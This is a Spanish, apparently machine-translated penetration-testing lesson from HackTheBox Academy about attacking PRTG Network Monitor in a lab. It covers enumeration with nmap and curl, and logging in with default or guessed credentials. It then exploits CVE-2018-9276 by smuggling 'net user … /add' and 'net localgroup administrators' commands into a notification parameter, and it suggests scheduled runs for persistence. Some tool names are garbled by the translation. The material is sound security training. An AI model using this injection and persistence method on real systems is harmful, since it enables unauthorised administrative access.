# PRTG Network Monitor

[Monitor de red PRTG](https://www.paessler.com/prtg)es el software de monitor de red sin agente. Se puede utilizar para monitorear el uso del ancho de banda, el tiempo de actividad y recopilar estadísticas de varios hosts, incluidos enrutadores, interruptores, servidores y más. La primera versión de PRTG se lanzó en 2003. En 2015 se lanzó una versión gratuita de PRTG, restringida a 100 sensores que se pueden usar para monitorear hasta 20 hosts. Funciona con un modo de autodescubrimiento para escanear áreas de una red y crear una lista de dispositivos. Una vez que se crea esta lista, puede recopilar más información de los dispositivos detectados utilizando protocolos como ICMP, SNMP, WMI, NetFlow y más. Los dispositivos también pueden comunicarse con la herramienta a través de una API REST. El software se ejecuta completamente desde un sitio web basado en AJAX, pero hay una aplicación de escritorio disponible para Windows, Linux y MacOS. Algunos puntos de datos interesantes sobre PRTG:

- Según la compañía, es utilizado por 300,000 usuarios en todo el mundo
- La compañía que fabrica la herramienta, Paessler, ha estado creando soluciones de monitoreo desde 1997
- Algunas organizaciones que usan PRTG para monitorear sus redes incluyen el Aeropuerto Internacional de Nápoles, Virginia Tech, 7-Eleven, y[más](https://www.paessler.com/company/casestudies)

Con los años, PRTG ha sufrido[26 vulnerabilidades](https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html)que fueron asignados CVE. De todos estos, solo cuatro tienen POC públicos fáciles de encontrar, dos secuencias de comandos de sitios cruzados (XSS), una negación de servicio y una vulnerabilidad de inyección de comandos autenticada que cubriremos en esta sección. Es raro ver a PRTG expuesto externamente, pero a menudo hemos encontrado PRTG durante las pruebas de penetración interna. La caja de lanzamiento semanal HTB[Netón](https://0xdf.gitlab.io/2019/06/29/htb-netmon.html)Muestra prtg.

---

# **Descubrimiento/huella/enumeración**

Podemos descubrir rápidamente PRTG de un escaneo NMAP. Por lo general, se puede encontrar en puertos web comunes como 80, 443 o 8080. Es posible cambiar el puerto de interfaz web en la sección de configuración cuando se registra como administrador.

Monitor de red PRTG

```
xnoxos@htb[/htb]$ sudo nmap -sV -p- --open -T4 10.129.201.50Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 15:41 EDT
Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.06% done
Nmap scan report for 10.129.201.50
Host is up (0.11s latency).
Not shown: 65492 closed ports, 24 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  ssl/http      Splunkd httpd
8080/tcp  open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
8089/tcp  open  ssl/http      Splunkd httpd
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.17 seconds

```

Desde el escaneo nmap anterior, podemos ver el servicio`Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)`detectado en el puerto 8080.

PRTG también aparece en el escaneo de testigos oculares que realizamos anteriormente. Aquí podemos ver que el testigo ocular enumera las credenciales predeterminadas`prtgadmin:prtgadmin`. Por lo general, se llenan previamente en la página de inicio de sesión, y a menudo los encontramos sin cambios. Los escáneres de vulnerabilidad como Nessus también tienen[complementos](https://www.tenable.com/plugins/nessus/51874)que detectan la presencia de PRTG.

![](https://academy.hackthebox.com/storage/modules/113/prtg_eyewitness.png)

Una vez que hayamos descubierto PRTG, podemos confirmar navegar en la URL y se nos presenta la página de inicio de sesión.

![](https://academy.hackthebox.com/storage/modules/113/prtg_login.png)

De la enumeración que realizamos hasta ahora, parece ser la versión PRTG`17.3.33.2830`y probablemente sea vulnerable a[CVE-2018-9276](https://nvd.nist.gov/vuln/detail/CVE-2018-9276)que es una inyección de comando autenticada en la consola web del administrador del sistema PRTG para el monitor de red PRTG antes de la versión 18.2.39. Según la versión informada por NMAP, podemos suponer que estamos tratando con una versión vulnerable. Usando`cURL`Podemos ver que el número de versión es de hecho`17.3.33.283`.

Monitor de red PRTG

```
xnoxos@htb[/htb]$ curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version  <link rel="stylesheet" type="text/css" href="/css/prtgmini.css?prtgversion=17.3.33.2830__" media="print,screen,projection" />
<div><h3><a target="_blank" href="https://blog.paessler.com/new-prtg-release-21.3.70-with-new-azure-hpe-and-redfish-sensors">New PRTG release 21.3.70 with new Azure, HPE, and Redfish sensors</a></h3><p>Just a short while ago, I introduced you to PRTG Release 21.3.69, with a load of new sensors, and now the next version is ready for installation. And this version also comes with brand new stuff!</p></div>
    <span class="prtgversion">&nbsp;PRTG Network Monitor 17.3.33.2830 </span>

```

Nuestro primer intento de iniciar sesión con las credenciales predeterminadas falla, pero algunos intentos más tarde, estamos en`prtgadmin:Password123`.

![](https://academy.hackthebox.com/storage/modules/113/prtg_logged_in.png)

---

# **Aprovechando vulnerabilidades conocidas**

Una vez iniciado sesión, podemos explorar un poco, pero sabemos que esto probablemente sea vulnerable a una falla de inyección de comando, así que vamos a hacerlo bien. Este excelente[blog](https://www.codewatch.org/blog/?p=453)Por el individuo que descubrió este defecto hace un gran trabajo caminando por el proceso de descubrimiento inicial y cómo lo descubrieron. Al crear una nueva notificación, el`Parameter`El campo se pasa directamente a un script de PowerShell sin ningún tipo de desinfección de entrada.

Para comenzar, mouse`Setup`en la parte superior derecha y luego en el`Account Settings`menú y finalmente haga clic en`Notifications`.

![](https://academy.hackthebox.com/storage/modules/113/prtg_notifications.png)

A continuación, haga clic en`Add new notification`.

![](https://academy.hackthebox.com/storage/modules/113/prtg_add.png)

Dale un nombre a la notificación y desplácese hacia abajo y marque la casilla al lado de`EXECUTE PROGRAM`. Bajo`Program File`, seleccionar`Demo exe notification - outfile.ps1`del menú desplegable. Finalmente, en el campo de parámetros, ingrese un comando. Para nuestros propósitos, agregaremos un nuevo usuario de administración local ingresando`test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add`. Durante una evaluación real, es posible que deseemos hacer algo que no cambie el sistema, como obtener una carcasa inversa o una conexión con nuestro C2 favorito. Finalmente, haga clic en el`Save`botón.

![](https://academy.hackthebox.com/storage/modules/113/prtg_execute.png)

Después de hacer clic`Save`, seremos redirigidos al`Notifications`página y ver nuestra nueva notificación nombrada`pwn`en la lista.

![](https://academy.hackthebox.com/storage/modules/113/prtg_pwn.png)

Ahora, podríamos haber programado la notificación para ejecutar (y ejecutar nuestro comando) en un momento posterior al configurarlo. Esto podría ser útil como un mecanismo de persistencia durante un compromiso a largo plazo y vale la pena tomar nota. Los horarios se pueden modificar en el menú Configuración de la cuenta si queremos configurarlo para que se ejecute en un momento específico todos los días para recuperar nuestra conexión o algo de esa naturaleza. En este punto, todo lo que queda es hacer clic en el`Test`Botón para ejecutar nuestra notificación y ejecutar el comando para agregar un usuario administrador local. Después de hacer clic`Test`Obtendremos una ventana emergente que diga`EXE notification is queued up`. Si recibimos algún tipo de mensaje de error aquí, podemos regresar y verificar la configuración de notificación.

Dado que esta es una ejecución de comandos ciegos, no recibiremos ningún comentario, por lo que tendríamos que consultar a nuestro oyente para que vuelva a una conexión o, en nuestro caso, verifique si podemos autenticarnos en el host como administrador local. Podemos usar`CrackMapExec`Para confirmar el acceso de administrador local. También podríamos intentar RDP a la caja, acceder a WinRM o usar una herramienta como[Evil-Winrm](https://github.com/Hackplayers/evil-winrm)o algo del[embalsar](https://github.com/SecureAuthCorp/impacket)kit de herramientas como`wmiexec.py`o`psexec.py`.

Monitor de red PRTG

```
xnoxos@htb[/htb]$ sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! SMB         10.129.201.50   445    APP03            [*] Windows 10.0 Build 17763 (name:APP03) (domain:APP03) (signing:False) (SMBv1:False)
SMB         10.129.201.50   445    APP03            [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)

```

¡Y confirmamos el acceso local de administrador en el objetivo! Trabaje el ejemplo y replique todos los pasos por su cuenta contra el sistema de destino. Desafíe también a aprovechar la vulnerabilidad de inyección de comando para obtener una conexión de carcasa inversa del objetivo.

---

# **Adelante**

Ahora que hemos cubierto Splunk y PRTG, sigamos adelante y discutamos algunas herramientas comunes de gestión de servicio al cliente y gestión de configuración y veamos cómo podemos abusar de ellos durante nuestros compromisos.